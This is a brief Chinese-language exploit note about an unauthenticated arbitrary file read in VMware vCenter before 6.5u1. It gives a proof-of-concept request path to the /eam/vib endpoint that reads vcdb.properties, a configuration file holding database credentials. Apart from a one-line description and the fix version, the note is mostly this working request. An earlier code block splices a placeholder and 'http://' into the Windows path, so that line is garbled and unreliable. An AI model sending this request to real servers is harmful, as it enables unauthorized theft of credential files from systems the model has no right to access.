# VMware vCenter 未经身份验证任意文件读取漏洞 < 6.5u1


VMware vCenter 未经身份验证任意文件读取漏洞 < 6.5u1, VMware透露此漏洞已在6.5u1中修复，但未分配CVE。


```bash
$user/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\http://vcdb.properties

```

![](media/16097312577420/16097312718885.jpg)


PoC


```
/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
```